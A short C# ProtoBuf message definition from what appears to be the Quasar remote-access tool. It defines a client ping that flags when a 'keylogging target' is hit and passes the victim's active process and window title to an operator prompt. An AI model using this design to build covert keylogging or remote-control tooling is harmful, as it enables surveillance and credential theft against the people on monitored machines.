using ProtoBuf;

namespace Quasar.Common.Messages
{
    /// <summary>
    /// Sent by the client periodically to indicate liveness.
    /// Server should only accept it when the client row's "Accept Ping" is enabled.
    /// </summary>
    [ProtoContract]
    public class ClientPingRequest : IMessage
    {
        [ProtoMember(1)]
        public string Uuid { get; set; } = "";

        // When true, the client is requesting operator approval to connect now
        // because a keylogging target was hit.
        [ProtoMember(2)]
        public bool TargetHit { get; set; } = false;

        // Optional context to show in the operator prompt when TargetHit is true.
        [ProtoMember(3)]
        public string ActiveProcessName { get; set; } = "";

        // Optional context to show in the operator prompt when TargetHit is true.
        [ProtoMember(4)]
        public string ActiveWindowTitle { get; set; } = "";
    }
}

